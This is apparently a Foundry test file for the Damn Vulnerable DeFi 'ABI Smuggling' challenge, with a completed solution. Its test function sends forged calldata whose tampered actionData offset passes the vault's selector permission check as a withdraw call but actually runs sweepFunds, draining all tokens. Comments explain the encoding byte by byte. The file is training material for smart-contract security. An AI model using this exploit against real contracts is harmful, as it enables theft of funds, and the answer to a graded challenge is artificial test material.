// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {SelfAuthorizedVault, AuthorizedExecutor, IERC20} from "../../src/abi-smuggling/SelfAuthorizedVault.sol";

contract ABISmugglingChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant VAULT_TOKEN_BALANCE = 1_000_000e18;

    DamnValuableToken token;
    SelfAuthorizedVault vault;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableToken();

        // Deploy vault
        vault = new SelfAuthorizedVault();

        // Set permissions in the vault
        bytes32 deployerPermission = vault.getActionId(hex"85fb709d", deployer, address(vault));
        bytes32 playerPermission = vault.getActionId(hex"d9caed12", player, address(vault));
        bytes32[] memory permissions = new bytes32[](2);
        permissions[0] = deployerPermission;
        permissions[1] = playerPermission;
        vault.setPermissions(permissions);

        // Fund the vault with tokens
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        // Vault is initialized
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertTrue(vault.initialized());

        // Token balances are correct
        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
        assertEq(token.balanceOf(player), 0);

        // Cannot call Vault directly
        vm.expectRevert(SelfAuthorizedVault.CallerNotAllowed.selector);
        vault.sweepFunds(deployer, IERC20(address(token)));
        vm.prank(player);
        vm.expectRevert(SelfAuthorizedVault.CallerNotAllowed.selector);
        vault.withdraw(address(token), player, 1e18);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_abiSmuggling() public checkSolvedByPlayer {
        // This encoding represents a call to SelfAuthorizedVault::execute with substituted offset to the actionData parameter
        bytes memory callData =
            hex"1cff79cd0000000000000000000000001240fa2a84dd9157a0e76b5cfe98b1d52268b26400000000000000000000000000000000000000000000000000000000000000E00000000000000000000000000000000000000000000000000000000000000064d9caed120000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b00000000000000000000000073030b99950fb19c6a813465e58a0bca5487fbea000000000000000000000000000000000000000000000000000000000000007b00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004485fb709d00000000000000000000000073030b99950fb19c6a813465e58a0bca5487fbea0000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b";

        // Call the contract and steal DVT tokens
        (bool success,) = address(vault).call(callData);
        require(success, "Call failed");

        // Below is the encoding of the callData, step by step:

        // 0x1cff79cd                                                       -- SelfAuthorizedVault::execute selector
        // 0000000000000000000000001240fa2a84dd9157a0e76b5cfe98b1d52268b264 -- vault address
        // 00000000000000000000000000000000000000000000000000000000000000E0 -- @note offset to actionData, 0xE0 = 224 instead of 0x40 = 64
        // 0000000000000000000000000000000000000000000000000000000000000064 -- the length of the encoded withdraw function call, which is permissioned for player
        // d9caed12                                                         -- SelfAuthorizedVault::withdraw selector
        // 0000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b -- address of DVT token contract
        // 00000000000000000000000073030b99950fb19c6a813465e58a0bca5487fbea -- recovery address
        // 000000000000000000000000000000000000000000000000000000000000007b -- amount to withdraw, 123 in hex
        // 00000000000000000000000000000000000000000000000000000000         -- padding of 24 bytes
        // 0000000000000000000000000000000000000000000000000000000000000044 -- the length of the encoded sweepFunds function call, which is permissioned only for deployer
        // 85fb709d                                                         -- SelfAuthorizedVault::sweepFunds selector
        // 00000000000000000000000073030b99950fb19c6a813465e58a0bca5487fbea -- recovery address
        // 0000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b -- address of DVT token contract
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // All tokens taken from the vault and deposited into the designated recovery account
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}
